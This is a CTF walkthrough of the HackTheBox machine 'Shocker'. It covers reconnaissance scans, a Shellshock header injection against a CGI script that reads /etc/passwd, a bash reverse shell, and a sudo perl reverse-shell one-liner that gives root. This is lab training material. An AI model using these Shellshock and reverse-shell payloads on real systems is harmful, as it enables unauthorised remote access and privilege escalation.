[Main Page](../index.md) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.md) \| [How-To Guides](../How-To-Guides/HowTo-index.md) <br>


# CTF Writeup:
# Shocker on HackTheBox
<br>
![a0-logo](https://cdn.discordapp.com/attachments/361185466101530626/414537232020406272/glitchygif.gif)
<br>
## 17 February 2018



## Introduction

Shocker is one of those CTF's designed to for the player to experience a major vulnerability.
Like [Blue](Blue-HTB.md) before it, it is a beginner CTF that requires prior knowledge or a bit of outside-the-box thinking.

Due to the severity of these vulnerabilities, however, once you've exploited it, it is pretty smooth sailing. Shocker's root doesn't crack exactly as easily as Blue, but is still pretty trivial.

I recommend it to

This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work.




## 1. Initial Scans

A quick `nmap` scan will start us off.

nmap -F -sV 10.10.10.56 -oG nmap_quicksearch


We'll write the output to a `grep`-able format using the  `-oG` flag.


```
Starting Nmap 7.60 \( https://nmap.org ) at 2018-02-17 13:36 EST
Nmap scan report for 10.10.10.56
Host is up (0.036s latency).
Not shown: 99 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.08 seconds
```

We'll be starting with HTTP, it seems.
`nikto` and [dirsearch](https://github.com/maurosoria/dirsearch) - do your stuff!



* `nikto -h 'http://10.10.10.56' -o nikto_result.txt`


```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.56
+ Target Hostname:    10.10.10.56
+ Target Port:        80
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x89 0x559ccac257884
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8310 requests: 0 error(s) and 6 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`nikto` has told us the same information that the `nmap` quickscan has.


We'll start with the shallowest dirsearch scan, and dive deeper if necessary.

* `dirsearch -u 'http://10.10.10.56' -e php,html,js,txt --plain-text-report = dirsearch_quick`

```
 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php, html, js, txt | Threads: 10 | Wordlist size: 6996

Target: http://10.10.10.56

...(some uninteresting results)...

[13:41:31] 403 -  294B  - /cgi-bin/
[13:41:37] 200 -  137B  - /index.html
[13:41:44] 403 -  299B  - /server-status
[13:41:44] 403 -  300B  - /server-status/
```


Those directories appear to be the most interesting, but let's try our patented "dual bio-optical" scan program.

<br>
![sitescreenshot](https://i.imgur.com/NubtDDU.png)
<br>

This monster creature wants to be left alone and is willing to defend himself with that hammer if needed.
What a strange little image.

We can download it and check it for steganography, but I wasn't able to find anything.
Since this image is our only lead on the webpage, I thought it was worth a bit of further investigation.


I took a page from the OSINT book and hit it with a reverse image search.

<br>
![malwarebug](https://i.imgur.com/mwLt5In.png)
<br>


Hmm... these results are pretty non-specific. <br>
Our bug has a message for us, *"Don't bug me!"* <br>
 We can add that to our search

<br>
![dontbugme](https://i.imgur.com/Oei75Wb.png)
<br>

At first, these results seem similar to our first.<br> However, a very interesting result lies just down the page

<br>
![goingbyshellshock](https://i.imgur.com/fHiBgTy.png)
<br>


The included text tells a very interesting story:


*The Bash Bug - also going by the nickname "Shellshock" - has been discovered this week and identified as a serious threat to computers of al kinds...*



We'd like to pose a "serious threat" to this CTF, and with a box name of __Shocker__, we just might.



## 2. Bashing the Bug/Shocking the Shell


We originally found the image at [this Slashgear article](https://www.slashgear.com/bash-bug-affects-os-x-linux-worse-than-heartbleed-25347915/), which itself linked to [this Seclists post](http://seclists.org/oss-sec/2014/q3/650). The SecLists post explained that using a clever combination of curly brackets and semicolons in an HTTP request, we may be able to inject code that runs on a webserver.


Our box is nothing but a webserver, as far as we can tell, and we can use `curl` to send custom HTTP requests. We need to find out just where to send it.


Some more searching lead me to [this GitHub page by opsxcq](https://github.com/opsxcq/exploit-CVE-2014-6271) which outlined a beautiful one-line command to read the `/etc/passwd` file of a system.

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://localhost:8080/cgi-bin/vulnerable
```


`dirsearch` discovered that our box has a `/cgi-bin/` directory.
Maybe there is a shell script in that directory we can tap in to.

* `dirsearch -u 'http://10.10.10.56/cgi-bin/' -e sh --plain-text-report=dirsearch_shellsearch`


<br>
![found_user_sh](https://i.imgur.com/2EKBk6M.png)
<br>


*Hello there...*


We can alter opsxcq's one liner to include the correct HTTP location and give it a test run.

* `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" 'http://10.10.10.56/cgi-bin/user.sh'`


<br>
![testoneliner](https://i.imgur.com/VP89w91.png)
<br>


We've done it, command injection.
Time to drop in a revere shell command.

First, start your listener.

* `nc -lnvp PORTNUM`

Then, run the RevShell shellshock command in another terminal.

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/local.machine.HTB.ip/PORTNUM 0>&1'" \http://10.10.10.56/cgi-bin/user.sh`


<br>
![call_me_shelly](https://i.imgur.com/h9pFcs0.png)
<br>


## 3. A User Named "Shelly" - *__GET IT?__*


Retrieve the user flag.

* `ls ~`
* `cat ~/user.txt`

```
shelly@Shocker:/home/shelly$ ls ~
user.txt

shelly@Shocker:/home/shelly$ cat ~/user.txt
```

User Flag Captured!

Time to see what Shelly can do.

* `sudo -l`

```
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```


Shelly can run perl as root using `sudo` !
All that stands between us and a root shell is finding the right command.


From my trusty __Red Team Field Manual__ by Ben Clark, I found this:

`perl -e 'use Socket;$i="local.machine.ip.addr";$p=PORTNUM;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`


Start a second listener on your local machine at a new port, then run the command below.


`sudo perl -e 'use Socket;$i="local.machine.HTB.ip";$p=PORTNUM_B;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`


<br>
![rooted](https://i.imgur.com/p8A72wZ.png)
<br>

## 4. Root Flag

We're the boss.
Now to just get the root flag.

* `ls ~`
* `cat ~/root.txt`

```
# ls ~
root.txt

# cat ~/root.txt
```

Root Flag Captured!


## Conclusion

When doing CTFs, you have the benefit of decades of security history to support you.
There is no substitute for experience, but browsing through the timeline of major cybersecurity stories might be the next best thing. Studying bugs like this give you an idea of real-world scenarios and what kinds of attacks actually have worked.





<br>

## Thanks for reading!

[Main Page](../index.md) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.md) \| [How-To Guides](../How-To-Guides/HowTo-index.md) <br>
